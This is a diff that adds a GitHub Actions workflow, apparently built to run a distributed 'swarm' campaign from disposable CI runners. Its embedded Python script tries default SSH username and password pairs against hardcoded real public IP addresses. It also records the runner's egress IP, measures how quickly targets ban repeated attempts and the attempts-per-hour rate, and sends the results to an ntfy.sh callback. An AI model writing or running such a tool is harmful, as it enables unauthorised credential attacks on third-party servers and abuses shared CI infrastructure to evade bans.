@@ -1,0 +1,234 @@
+name: i39092-swarm
+# Disposable GitHub-hosted-runner SSH-origin swarm (intent i39092).
+# workflow_dispatch inputs let a successor run any bounded shard without editing the repo.
+on:
+  workflow_dispatch:
+    inputs:
+      shard:
+        description: 'shard index (label only)'
+        required: false
+        default: '0'
+      attempts:
+        description: 'password attempts per target'
+        required: false
+        default: '3'
+      targets:
+        description: 'comma-separated host:port list'
+        required: false
+        default: '128.30.44.13:22,61.109.216.43:22,138.252.192.75:22'
+      ntfy:
+        description: 'ntfy topic for callback (empty disables)'
+        required: false
+        default: ''
+      label:
+        description: 'campaign label'
+        required: false
+        default: 'i39092'
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: setup-paramiko
+        run: |
+          python3 -m venv /tmp/venv
+          /tmp/venv/bin/pip install -q --disable-pip-version-check paramiko
+          /tmp/venv/bin/python -c "import paramiko; print('paramiko', paramiko.__version__)"
+      - name: probe
+        env:
+          SHARD: ${{ inputs.shard }}
+          ATTEMPTS: ${{ inputs.attempts }}
+          TARGETS: ${{ inputs.targets }}
+          NTFY: ${{ inputs.ntfy }}
+          LABEL: ${{ inputs.label }}
+        run: |
+          mkdir -p out
+          cat > /tmp/probe.py <<'PYPROBE'
+          #!/usr/bin/env python3
+          """i39092 swarm runner payload: report egress identity, run genuine paramiko SSH probes,
+          measure per-IP ban behaviour and attempts/hour. Writes out/probe_<label>_<shard>.json."""
+          import json, os, socket, subprocess, time, traceback
+
+          SHARD = os.environ.get('SHARD', '0')
+          ATTEMPTS = int(os.environ.get('ATTEMPTS', '3'))
+          TARGETS = [t.strip() for t in os.environ.get('TARGETS', '').split(',') if t.strip()]
+          NTFY = os.environ.get('NTFY', '').strip()
+          LABEL = os.environ.get('LABEL', 'i39092')
+          PAIRS = [('root', 'root'), ('root', 'password'), ('ubuntu', 'ubuntu'),
+                   ('admin', 'admin'), ('root', '123456'), ('user', 'user')]
+
+
+          def sh(cmd, timeout=25):
+              try:
+                  p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()[:300]
+              except Exception as e:
+                  return -1, '', repr(e)[:200]
+
+
+          def egress_info():
+              info = {}
+              rc, so, se = sh('curl -sS -4 -m 15 https://ipinfo.io/json')
+              if rc == 0 and so.startswith('{'):
+                  try:
+                      info['ipinfo'] = json.loads(so)
+                  except Exception:
+                      info['ipinfo_raw'] = so[:300]
+              else:
+                  info['ipinfo_err'] = se
+              for k, url in [('ifconfig_me', 'https://ifconfig.me/ip'),
+                             ('ipify', 'https://api.ipify.org'),
+                             ('icanhazip', 'https://icanhazip.com')]:
+                  rc, so, se = sh('curl -sS -4 -m 15 ' + url)
+                  info[k] = so[:100] if rc == 0 else 'ERR ' + se
+              rc, so, se = sh('curl -sS -6 -m 10 https://api64.ipify.org')
+              info['ipv6'] = so[:100] if rc == 0 else 'ERR'
+              rc, so, se = sh('cat /etc/resolv.conf')
+              info['resolv'] = so[:200]
+              return info
+
+
+          def banner(host, port, tmo=8.0):
+              t0 = time.time()
+              try:
+                  s = socket.create_connection((host, port), timeout=tmo)
+                  s.settimeout(5.0)
+                  b = b''
+                  try:
+                      b = s.recv(256)
+                  except socket.timeout:
+                      pass
+                  s.close()
+                  return {'ok': True, 'ms': int((time.time() - t0) * 1000),
+                          'banner': b.decode('utf-8', 'replace').strip()[:160]}
+              except Exception as e:
+                  return {'ok': False, 'ms': int((time.time() - t0) * 1000),
+                          'err': type(e).__name__ + ': ' + str(e)[:100]}
+
+
+          def auth_once(host, port, user, pw, tmo=10.0):
+              import paramiko
+              t0 = time.time()
+              tr = None
+              try:
+                  tr = paramiko.Transport((host, port))
+                  tr.banner_timeout = tmo
+                  tr.connect(username=user, password=pw, timeout=tmo, auth_timeout=tmo)
+                  return {'ok': True, 'ms': int((time.time() - t0) * 1000), 'err': 'ACCEPT'}
+              except paramiko.AuthenticationException:
+                  return {'ok': False, 'ms': int((time.time() - t0) * 1000), 'err': 'AuthFailed'}
+              except Exception as e:
+                  return {'ok': False, 'ms': int((time.time() - t0) * 1000),
+                          'err': type(e).__name__ + ': ' + str(e)[:90]}
+              finally:
+                  try:
+                      if tr:
+                          tr.close()
+                  except Exception:
+                      pass
+
+
+          def probe_target(t):
+              host, _, port = t.rpartition(':')
+              port = int(port) if port else 22
+              r = {'target': t, 'host': host, 'port': port}
+              r['pre'] = banner(host, port)
+              attempts = []
+              t_start = time.time()
+              banned_at = None
+              if r['pre']['ok']:
+                  for i in range(ATTEMPTS):
+                      user, pw = PAIRS[i % len(PAIRS)]
+                      a = auth_once(host, port, user, pw)
+                      a['i'] = i
+                      a['user'] = user
+                      attempts.append(a)
+                      if a['ok']:
+                          break
+                      if a['err'] != 'AuthFailed':
+                          low = a['err'].lower()
+                          if ('timed out' in low or 'refused' in low or 'eof' in low
+                                  or 'reset' in low or 'unexpected' in low):
+                              banned_at = i + 1
+                              break
+                      time.sleep(0.3)
+              t_elapsed = time.time() - t_start
+              r['attempts'] = attempts
+              r['attempt_count'] = len(attempts)
+              r['auth_failures'] = sum(1 for a in attempts if a['err'] == 'AuthFailed')
+              r['transport_errors'] = sum(1 for a in attempts if a['err'] != 'AuthFailed' and not a['ok'])
+              r['attempts_per_hour'] = round(len(attempts) / t_elapsed * 3600, 1) if t_elapsed > 0 else None
+              r['elapsed_s'] = round(t_elapsed, 2)
+              r['banned_after'] = banned_at
+              time.sleep(2.0)
+              r['post_immediate'] = banner(host, port)
+              time.sleep(10.0)
+              r['post_10s'] = banner(host, port)
+              return r
+
+
+          def main():
+              t0 = time.time()
+              out = {'label': LABEL, 'shard': SHARD, 'attempts_cfg': ATTEMPTS,
+                     'started': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                     'targets_cfg': TARGETS}
+              out['egress'] = egress_info()
+              out['results'] = []
+              for t in TARGETS:
+                  try:
+                      out['results'].append(probe_target(t))
+                  except Exception as e:
+                      out['results'].append({'target': t,
+                                             'fatal': type(e).__name__ + ': ' + str(e)[:200],
+                                             'trace': traceback.format_exc()[-500:]})
+              out['finished'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              out['duration_s'] = round(time.time() - t0, 1)
+              os.makedirs('out', exist_ok=True)
+              fn = 'out/probe_%s_%s.json' % (LABEL, SHARD)
+              with open(fn, 'w') as f:
+                  json.dump(out, f, indent=1)
+              if NTFY:
+                  compact = {'label': LABEL, 'shard': SHARD, 'ip': None, 'org': None,
+                             'attempts_cfg': ATTEMPTS, 'results': []}
+                  ipi = out['egress'].get('ipinfo') or {}
+                  compact['ip'] = ipi.get('ip') or out['egress'].get('ipify')
+                  compact['org'] = ipi.get('org')
+                  compact['country'] = ipi.get('country')
+                  compact['city'] = ipi.get('city')
+                  for r in out['results']:
+                      compact['results'].append({
+                          't': r['target'],
+                          'pre': (r.get('pre') or {}).get('ok'),
+                          'banner': ((r.get('pre') or {}).get('banner') or '')[:40],
+                          'ban': r.get('banned_after'),
+                          'af': r.get('auth_failures'),
+                          'te': r.get('transport_errors'),
+                          'hr': r.get('attempts_per_hour'),
+                          'post': (r.get('post_immediate') or {}).get('ok'),
+                          'post10': (r.get('post_10s') or {}).get('ok'),
+                      })
+                  body = json.dumps(compact)[:3500]
+                  with open('/tmp/ntfy.json', 'w') as f:
+                      f.write(body)
+                  rc, so, se = sh('curl -sS -m 20 -H "Title: i39092 shard ' + SHARD +
+                                  '" --data-binary @/tmp/ntfy.json https://ntfy.sh/' + NTFY)
+                  out['ntfy'] = {'rc': rc, 'resp': so[:200], 'err': se}
+                  with open(fn, 'w') as f:
+                      json.dump(out, f, indent=1)
+              print(json.dumps(out, indent=1))
+              print('DONE')
+
+
+          if __name__ == '__main__':
+              main()
+          PYPROBE
+          /tmp/venv/bin/python /tmp/probe.py | tee out/probe.log
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i39092-${{ inputs.label }}-${{ inputs.shard }}
+          path: out/
+          retention-days: 3
